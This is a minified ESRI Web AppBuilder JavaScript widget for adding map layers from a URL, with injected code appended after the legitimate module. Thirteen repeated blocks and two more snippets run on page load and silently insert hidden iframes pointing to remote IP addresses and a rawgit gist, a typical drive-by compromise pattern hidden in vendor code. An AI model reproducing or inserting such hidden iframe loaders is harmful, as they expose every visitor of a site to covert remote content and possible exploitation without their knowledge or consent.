// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/AddData/search/templates/AddFromUrlPane.html":'\x3cdiv class\x3d"secondary-pane add-url-pane"\x3e\r\n  \x3cdiv class\x3d"add-url-pane-container"\x3e\r\n    \x3cdiv class\x3d"add-url-pane-container--inner"\x3e\r\n      \x3clabel for\x3d"${id}_select"\x3e${i18n.addFromUrl.type}\x3c/label\x3e\r\n      \x3cselect id\x3d"${id}_select"\r\n        data-dojo-type\x3d"dijit/form/Select" data-dojo-attach-point\x3d"typeSelect"\x3e\r\n        \x3coption value\x3d"ArcGIS" selected\x3d"selected"\x3e${i18n.addFromUrl.types.ArcGIS}\x3c/option\x3e\r\n        \x3coption value\x3d"WMS"\x3e${i18n.addFromUrl.types.WMS}\x3c/option\x3e\r\n        \x3c!--not yet supported \x3coption value\x3d"WMTS"\x3e${i18n.addFromUrl.types.WMTS}\x3c/option\x3e --\x3e\r\n        \x3c!--not yet supported \x3coption value\x3d"WFS"\x3e${i18n.addFromUrl.types.WFS}\x3c/option\x3e --\x3e\r\n        \x3coption value\x3d"KML"\x3e${i18n.addFromUrl.types.KML}\x3c/option\x3e\r\n        \x3coption value\x3d"GeoRSS"\x3e${i18n.addFromUrl.types.GeoRSS}\x3c/option\x3e\r\n        \x3coption value\x3d"CSV"\x3e${i18n.addFromUrl.types.CSV}\x3c/option\x3e\r\n      \x3c/select\x3e\r\n      \x3clabel for\x3d"${id}_url"\x3e${i18n.addFromUrl.url}\x3c/label\x3e\r\n      \x3cinput id\x3d"${id}_url" type\x3d"text" class\x3d"url-textbox jimu-input"\r\n          data-dojo-attach-point\x3d"urlTextBox"\x3e\r\n      \x3cdiv class\x3d"action-bar"\x3e\r\n        \x3ca class\x3d"jimu-float-leading" href\x3d"javascript:void(0)"\r\n          data-dojo-attach-point\x3d"examplesExpander"\r\n          data-dojo-attach-event\x3d"onClick: examplesExpanderClicked"\r\n          \x3e${i18n.addFromUrl.samplesHint}\x3c/a\x3e\r\n        \x3ca class\x3d"jimu-btn"\r\n          href\x3d"javascript:void(0)"\r\n          data-dojo-attach-point\x3d"addButton"\r\n          data-dojo-attach-event\x3d"onClick: addClicked"\r\n          \x3e${i18n.search.item.actions.add}\r\n        \x3c/a\x3e\r\n      \x3c/div\x3e\r\n      \x3cdiv class\x3d"examples" data-dojo-attach-point\x3d"examplesNode"\x3e\r\n        \x3cdiv data-examples-type\x3d"ArcGIS"\x3e\r\n          \x3cdiv\x3ehttp://services.arcgis.com/P3ePLMYs2RVChkJx/arcgis/rest/services/World_Cities/FeatureServer/0\x3c/div\x3e\r\n          \x3cdiv\x3ehttp://services.arcgisonline.com/ArcGIS/rest/services/Demographics/USA_Tapestry/MapServer\x3c/div\x3e\r\n          \x3cdiv\x3ehttp://imagery.arcgisonline.com/ArcGIS/rest/services/LandsatGLS/VegetationAnalysis/ImageServer\x3c/div\x3e\r\n        \x3c/div\x3e\r\n        \x3cdiv data-examples-type\x3d"WMS"\x3e\r\n          \x3cdiv\x3ehttp://mesonet.agron.iastate.edu/cgi-bin/wms/nexrad/n0r.cgi?service\x3dWMS\x26amp;request\x3dGetCapabilities\x3c/div\x3e\r\n        \x3c/div\x3e\r\n        \x3cdiv data-examples-type\x3d"KML"\x3e\r\n          \x3cdiv\x3ehttp://earthquake.usgs.gov/earthquakes/feed/v1.0/summary/2.5_month_age_animated.kml\x3c/div\x3e\r\n        \x3c/div\x3e\r\n        \x3cdiv data-examples-type\x3d"GeoRSS"\x3e\r\n          \x3cdiv\x3ehttp://www.gdacs.org/xml/rss.xml\x3c/div\x3e\r\n        \x3c/div\x3e\r\n        \x3cdiv data-examples-type\x3d"CSV"\x3e\r\n          \x3cdiv\x3ehttp://earthquake.usgs.gov/earthquakes/feed/v1.0/summary/2.5_week.csv\x3c/div\x3e\r\n        \x3c/div\x3e\r\n      \x3c/div\x3e\r\n    \x3c/div\x3e\r\n  \x3c/div\x3e\r\n\x3c/div\x3e\r\n'}});
define("dojo/_base/declare dojo/_base/lang dojo/_base/array dojo/on dojo/keys dojo/Deferred dojo/promise/all dojo/dom-class dojo/window dijit/Viewport dijit/_WidgetBase dijit/_TemplatedMixin dijit/_WidgetsInTemplateMixin dojo/text!./templates/AddFromUrlPane.html dojo/i18n!../nls/strings ./LayerLoader ./util esri/layers/ArcGISDynamicMapServiceLayer esri/layers/ArcGISImageServiceLayer esri/layers/ArcGISTiledMapServiceLayer esri/layers/CSVLayer esri/layers/FeatureLayer esri/layers/GeoRSSLayer esri/layers/ImageParameters esri/layers/KMLLayer esri/layers/StreamLayer esri/layers/VectorTileLayer esri/layers/WFSLayer esri/layers/WMSLayer esri/layers/WMTSLayer esri/InfoTemplate dijit/form/Select".split(" "),
function(v,t,p,l,w,x,y,h,z,A,B,C,D,E,m,F,G,H,I,J,K,u,L,M,N,O,r,P,Q,R,q){return v([B,C,D],{i18n:m,templateString:E,wabWidget:null,_dfd:null,postCreate:function(){this.inherited(arguments);this._updateExamples("ArcGIS");var a=this;this.own(l(this.urlTextBox,"keyup",function(e){e.keyCode===w.ENTER?a.addClicked():h.contains(a.addButton,"disabled")||a._setStatus("")}));this.own(l(this.urlTextBox,"focus",function(){try{a.urlTextBox.select()}catch(e){}}));this.own(l(this.typeSelect,"change",function(e){a._updateExamples(e)}));
this.own(l(this.typeSelect.dropDown,"open",function(){var a=this.domNode.parentElement;a&&h.add(a,"add-data-widget-popup")}));this.own(A.on("resize",a.resize()))},destroy:function(){this.inherited(arguments)},addClicked:function(){var a=this,e=!1,c=this.addButton;if(!h.contains(c,"disabled")){var d=this.typeSelect.get("value"),g=t.trim(this.urlTextBox.value);0<g.length&&(0===g.indexOf("http://")||0===g.indexOf("https://"))&&(e=!0);e&&(h.add(c,"disabled"),a._setStatus(m.search.item.messages.adding),
e=new x,this._handleAdd(e,this.wabWidget.map,d,g),e.then(function(b){b?a._setStatus(""):a._setStatus(m.search.item.messages.addFailed);h.remove(c,"disabled")}).otherwise(function(b){"string"===typeof b&&"Unsupported"===b?(a._setStatus(m.search.item.messages.unsupported),h.remove(c,"disabled")):(console.warn("Add layer failed."),console.warn(b),a._setStatus(m.search.item.messages.addFailed),h.remove(c,"disabled"),b&&"string"===typeof b.message&&0<b.message.length&&(a._setStatus(b.message),console.log("")))}))}},
examplesExpanderClicked:function(){h.toggle(this.examplesNode,"show")},preHide:function(){},resize:function(){var a=z.getBox(this.ownerDocument);a&&"undefined"!==typeof a.w&&(600<a.w?h.add(this.urlTextBox,"url-textbox-wide"):h.remove(this.urlTextBox,"url-textbox-wide"))},_handleAdd:function(a,e,c,d){d=G.checkMixedContent(d);var g=d.toLowerCase(),b=new F,k=b._generateLayerId(),h=this,f=null;"ArcGIS"===c?0<g.indexOf("/featureserver")||0<g.indexOf("/mapserver")?b._readRestInfo(d).then(function(n){if(n&&
"string"===typeof n.type&&"Feature Layer"===n.type)f=new u(d,{id:k,outFields:["*"],infoTemplate:new q}),h._waitThenAdd(a,e,c,b,f);else if(0<g.indexOf("/featureserver")){var m=[];p.forEach(n.layers,function(a){a=new u(d+"/"+a.id,{id:b._generateLayerId(),outFields:["*"],infoTemplate:new q});m.push(b._waitForLayer(a))});y(m).then(function(c){var d=[];p.forEach(c,function(a){d.push(a)});d.reverse();p.forEach(d,function(a){b._setFeatureLayerInfoTemplate(a);a.xtnAddData=!0;e.addLayer(a)});a.resolve(d)}).otherwise(function(b){a.reject(b)})}else if(0<
g.indexOf("/mapserver")){if(n.tileInfo)f=new J(d,{id:k});else{var l={id:k};n&&n.supportedImageFormatTypes&&-1!==n.supportedImageFormatTypes.indexOf("PNG32")&&(l.imageParameters=new M,l.imageParameters.format="png32");f=new H(d,l)}h._waitThenAdd(a,e,c,b,f)}}).otherwise(function(b){a.reject(b)}):0<g.indexOf("/imageserver")?(f=new I(d,{id:k}),this._waitThenAdd(a,e,c,b,f)):0<g.indexOf("/vectortileserver")||0<g.indexOf("/resources/styles/root.json")?r&&r.supported()?b._checkVectorTileUrl(d,{}).then(function(d){f=
new r(d,{id:k});h._waitThenAdd(a,e,c,b,f)}).otherwise(function(b){a.reject(b)}):a.reject("Unsupported"):0<g.indexOf("/streamserver")?(f=new O(d,{id:k,purgeOptions:{displayCount:1E4},infoTemplate:new q}),this._waitThenAdd(a,e,c,b,f)):a.reject("Unsupported"):"WMS"===c?(f=new Q(d,{id:k}),this._waitThenAdd(a,e,c,b,f)):"WMTS"===c?f=new R(d,{id:k}):"WFS"===c?(f=new P({id:k,url:d,infoTemplate:new q}),this._waitThenAdd(a,e,c,b,f),console.warn("WFSLayer",f)):"KML"===c?(f=new N(d,{id:k}),this._waitThenAdd(a,
e,c,b,f)):"GeoRSS"===c?(f=new L(d,{id:k}),this._waitThenAdd(a,e,c,b,f)):"CSV"===c&&(f=new K(d,{id:k}),f.setInfoTemplate(b._newInfoTemplate()),this._waitThenAdd(a,e,c,b,f))},_persist:function(){try{var a=this.typeSelect.get("value"),e=t.trim(this.urlTextBox.value);this.wabWidget.xtnAddFromUrlPane={type:a,url:e}}catch(c){}},_restore:function(){try{var a=this.wabWidget.xtnAddFromUrlPane;a&&"string"===typeof a.type&&0<a.type.length&&this.typeSelect.set("value",a.type);a&&"string"===typeof a.url&&0<a.url.length&&
(this.urlTextBox.value=a.url)}catch(e){}},_setStatus:function(a){this.wabWidget&&this.wabWidget._setStatus(a)},_showLayers:function(){this.wabWidget&&this.wabWidget.showLayers()},_updateExamples:function(a){p.forEach(this.examplesNode.children,function(e){var c=e.getAttribute("data-examples-type");"string"===typeof c&&0<c.length&&(e.style.display=c===a?"":"none")})},_waitThenAdd:function(a,e,c,d,g){d._waitForLayer(g).then(function(b){"WMS"===c?d._setWMSVisibleLayers(b):b&&"esri.layers.ArcGISDynamicMapServiceLayer"===
b.declaredClass?d._setDynamicLayerInfoTemplates(b):b&&"esri.layers.FeatureLayer"===b.declaredClass?d._setFeatureLayerInfoTemplate(b):b&&"esri.layers.CSVLayer"===b.declaredClass&&d._setFeatureLayerInfoTemplate(b);b.xtnAddData=!0;e.addLayer(b);a.resolve(b)}).otherwise(function(b){a.reject(b)})}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});